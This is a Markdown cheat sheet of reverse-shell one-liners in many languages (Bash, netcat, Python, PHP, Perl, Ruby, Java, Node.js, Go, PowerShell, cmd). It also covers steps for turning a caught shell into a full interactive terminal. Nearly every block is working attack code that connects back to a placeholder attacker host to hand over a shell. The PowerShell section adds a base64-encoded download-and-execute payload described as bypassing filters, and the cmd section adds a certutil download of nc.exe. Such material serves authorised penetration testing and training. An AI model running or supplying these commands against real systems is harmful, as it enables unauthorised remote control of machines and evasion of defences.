# Netcat — Reverse Shell One-Liners & Shell Upgrade

## Reverse Shell One-Liners (by Language)

### Bash / sh

```bash
bash -i >& /dev/tcp/<attacker>/4444 0>&1

# Older bash
exec /bin/bash 0&0 2>&0
exec 5<>/dev/tcp/<attacker>/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Netcat

```bash
# With -e
nc -e /bin/bash <attacker> 4444

# Without -e (mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker> 4444 > /tmp/f

# Busybox (embedded Linux)
busybox nc <attacker> 4444 -e /bin/sh
```

### Python

```bash
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

### PHP

```php
php -r '$sock=fsockopen("<attacker>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Web shell context
php -r '$sock=fsockopen("<attacker>",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### Perl

```bash
perl -e 'use Socket;$i="<attacker>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("<attacker>",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attacker>/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Node.js

```js
require('child_process').exec('bash -i >& /dev/tcp/<attacker>/4444 0>&1')

// Or as one-liner
node -e "require('child_process').exec('bash -i >& /dev/tcp/<attacker>/4444 0>&1')"
```

### Golang

```go
package main
import("net";"os/exec";"time")
func main(){c,_:=net.Dial("tcp","<attacker>:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();time.Sleep(1)}
```

### PowerShell (Windows)

```powershell
# One-liner (no spaces in IP)
powershell -c "$c=New-Object Net.Sockets.TCPClient('<attacker>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$se=([text.encoding]::ASCII).GetBytes($r2);$s.Write($se,0,$se.Length);$s.Flush()};$c.Close()"

# Encoded (bypasses simple filters)
$payload = 'IEX(New-Object Net.WebClient).downloadString("http://<attacker>/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded
```

### cmd.exe (Windows)

```cmd
# Using ncat
ncat -e cmd.exe <attacker> 4444

# Without ncat (requires certutil + nc)
certutil -urlcache -split -f http://<attacker>/nc.exe C:\Windows\Temp\nc.exe
C:\Windows\Temp\nc.exe -e cmd.exe <attacker> 4444
```

## Shell Upgrade (Linux — from dumb shell to full TTY)

```bash
# Step 1: Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
script /dev/null -c bash

# Step 2: Background the shell
# Ctrl+Z

# Step 3: Fix terminal
stty raw -echo
fg
# Press Enter twice if needed

# Step 4: Set env
export TERM=xterm-256color
stty rows 40 cols 200

# Alternative: use rlwrap on attacker
rlwrap nc -lvnp 4444
```

## Windows Shell Upgrade

```powershell
# Upgrade cmd to PowerShell from within nc shell
powershell -NoP -Exec Bypass

# Or ConPTY shell (full interactive Windows shell)
# Use: https://github.com/antonioCoco/ConPtyShell
Invoke-ConPtyShell <attacker_ip> 4444
```

## Catching Multiple Shells (ncat)

```bash
# ncat keeps listening after each connection
ncat -lvnp 4444 -k --allow 10.10.10.0/24
```
